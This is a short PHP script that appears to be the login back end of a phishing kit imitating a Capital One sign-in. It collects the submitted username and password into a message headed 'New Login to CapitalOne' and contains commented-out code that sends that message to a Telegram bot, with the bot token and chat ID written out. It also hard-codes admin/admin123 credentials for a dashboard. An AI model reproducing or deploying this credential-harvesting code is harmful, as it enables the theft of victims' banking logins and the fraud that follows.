<?php
session_start();

// What you entered doesn't match what we have on file. We can help you with your
include_once('bot.php');


if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['submit'])) {
    $username = $_POST["username"];
    $password = $_POST["password"];
}else{
    echo "login error";
};

$message = "🔥New Login to CapitalOne🔥\n";
$message = $meassage."Username: ".$username."\nPassword: ".$password;

if($username == "admin" && $password == "admin123"){
    $_SESSION["username"] = $username;
    header("Location: ../dashboard/index.php");

}else{
    
}


// $botToken = '5941110899:AAHmF4kUhivue6YhGS4T61g1TIUxGQkVis8';
// $chatId = '2087889282';

// if(sendTelegramMessage($botToken, $chatId, $message)){
//    echo "success";
// }


